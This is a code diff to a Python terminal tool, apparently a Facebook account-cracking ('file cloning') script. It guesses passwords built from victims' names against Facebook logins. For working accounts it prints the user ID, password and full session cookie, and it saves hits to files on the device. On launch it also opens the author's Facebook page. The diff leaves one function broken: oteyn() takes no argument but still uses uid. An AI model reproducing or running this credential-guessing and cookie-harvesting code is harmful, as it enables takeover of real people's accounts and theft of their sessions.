@@ -1012,7 +1012,7 @@ logo ="""
 \033[1;97m====================================================
 \033[1;97m[+]\033[1;34mAUTHOR   \033[1;90m: \033[1;93mOTEYN × EIFF
 \033[1;97m[+]\033[1;34mYOUTUBE  \033[1;90m: \033[1;93mNot Found !
-\033[1;97m[+]\033[1;34mWHATSAPP \033[1;90m: \033[1;93mWakeen
+\033[1;97m[+]\033[1;34mWHATSAPP \033[1;90m: \033[1;93mWakeen SY
 \033[1;97m[+]\033[1;34mVERSION  \033[1;90m: \033[1;93m0.1
 \033[1;97m[+]\033[1;34mSTATUS   \033[1;90m: \033[1;93mEXPERIMENT
 \033[1;97m===================================================="""
@@ -1028,41 +1028,42 @@ cps=[]
 pcp=[]
 id=[]
 tokenku=[]
+
 #_________Year checker_________#
-def asha(uid):
+def oteyn():
     if len(uid)==15:
-        if uid[:10] in ['1000000000']       :alif = ' • 2009'
-        elif uid[:9] in ['100000000']       :alif = ' • 2009'
-        elif uid[:8] in ['10000000']        :alif = ' • 2009'
-        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = ' • 2009'
-        elif uid[:7] in ['1000006','1000007','1000008','1000009']:alif = ' • 2010'
-        elif uid[:6] in ['100001']          :alif = ' • 2010/2011'
-        elif uid[:6] in ['100002','100003'] :alif = ' • 2011/2012'
-        elif uid[:6] in ['100004']          :alif = ' • 2012/2013'
-        elif uid[:6] in ['100005','100006'] :alif = ' • 2013/2014'
-        elif uid[:6] in ['100007','100008'] :alif = ' • 2014/2015'
-        elif uid[:6] in ['100009']          :alif = ' • 2015'
-        elif uid[:5] in ['10001']           :alif = ' •  2015/2016'
-        elif uid[:5] in ['10002']           :alif = ' • 2016/2017'
-        elif uid[:5] in ['10003']           :alif = ' • 2018/2019'
-        elif uid[:5] in ['10004']           :alif = ' • 2019/2020'
-        elif uid[:5] in ['10005']           :alif = ' • 2020'
-        elif uid[:5] in ['10006','10007','']:alif = ' • 2021'
-        elif uid[:5] in ['10008']           :alif = ' • 2022'
-        elif uid[:5] in ['10009','6155']  :alif = ' • 2023'
+        if uid[:10] in ['1000000000']       :alif = ' 2009'
+        elif uid[:9] in ['100000000']       :alif = ' 2009'
+        elif uid[:8] in ['10000000']        :alif = ' 2009'
+        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:alif = ' 2009'
+        elif uid[:7] in ['1000006','1000007','1000008','1000009']:alif = ' 2010'
+        elif uid[:6] in ['100001']          :alif = ' 2010/2011'
+        elif uid[:6] in ['100002','100003'] :alif = ' 2011/2012'
+        elif uid[:6] in ['100004']          :alif = ' 2012/2013'
+        elif uid[:6] in ['100005','100006'] :alif = ' 2013/2014'
+        elif uid[:6] in ['100007','100008'] :alif = ' 2014/2015'
+        elif uid[:6] in ['100009']          :alif = ' 2015'
+        elif uid[:5] in ['10001']           :alif = ' 2015/2016'
+        elif uid[:5] in ['10002']           :alif = ' 2016/2017'
+        elif uid[:5] in ['10003']           :alif = ' 2018/2019'
+        elif uid[:5] in ['10004']           :alif = ' 2019/2020'
+        elif uid[:5] in ['10005']           :alif = ' 2020'
+        elif uid[:5] in ['10006','10007','']:alif = ' 2021'
+        elif uid[:5] in ['10008']           :alif = ' 2022'
+        elif uid[:5] in ['10009']  :alif = ' 2023'
         else:alif=''
     elif len(uid) in [9,10]:
-        alif = ' • 2008/2009'
+        alif = ' 2008/2009'
     elif len(uid)==8:
-        alif = ' • 2007/2008'
+        alif = ' 2007/2008'
     elif len(uid)==7:
-        alif = ' • 2006/2007'
+        alif = ' 2006/2007'
     else:alif=''
     return alif
 
 os.system(f'xdg-open https://www.facebook.com/eiff.huczn')
 
-def KHUSHAL():
+def Kushal():
 	clear()
 	#ckx()
 	print(f"[1] FILE CLONING")
@@ -1086,6 +1087,7 @@ def KHUSHAL():
 		except:
 			ps_limit =1
 			clear()
+			
 		print(f'\033[1;33m[-] EXMPLE: first, first123, firstlast, first last, lastfirst ')
 		for i in range(ps_limit):
 			plist.append(input(f'\033[1;32m[-] PUT PASSWORD {i+1}: '))
@@ -1114,7 +1116,7 @@ def KHUSHAL():
 					
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [\033[1;32mOTEYN-PROCESSING\033[1;37m]:- %s |\033[1;32mOK:- %s \033[1;37m| \033[1;91mCPS:- %s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [\033[1;32mOTEYN M1-PROCESSING\033[1;37m]:- %s |\033[1;32mOK:- %s \033[1;37m| \033[1;91mCPS:- %s\033[1;37m'%(loop,len(oks),len(cps)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -1155,14 +1157,14 @@ def ffb(ids,names,passlist):
                         if "c_user" in Khushal:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\n\n\033[1;33m »» STATUS: \033[1;32m ALIVE\n\033[1;33m »» USER ID:\033[1;32m %s\n\033[1;33m »» PASSWORD:\033[1;32m %s\n'%(ids,pas,))
+                                print(f'\r\r\n\n\033[1;33m [»» STATUS]: \033[1;32m ALIVE\n\033[1;33m [»» USER ID]: \033[1;32m %s\n\033[1;33m [»» PASSWORD]: \033[1;32m %s\n\033[1;33m [»» SINCE]: \033[1;33m\n\033[1;33m [»» FB LINK]: \033[1;32mhttps://facebook.com/%s\n\033[1;33m [»» COOKIE]: \033[1;34m%s\n'%(ids,pas,ids,kuki))
                                 open(f'/sdcard/OTEYN-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Khushal:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;126m [OTEYN-CP] '+ids+' | '+pas+'\033[1;97m')
+                                        print(f'\r\r\x1b[38;5;126m [OTEYN-CP] '+ids+' | '+pas+'\033[1;97m\n')
                                         open(f'/sdcard/OTEYN-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
@@ -1413,4 +1415,4 @@ def api1(ids,names,passlist):
                         pass
 
 
-KHUSHAL()
+Kushal()
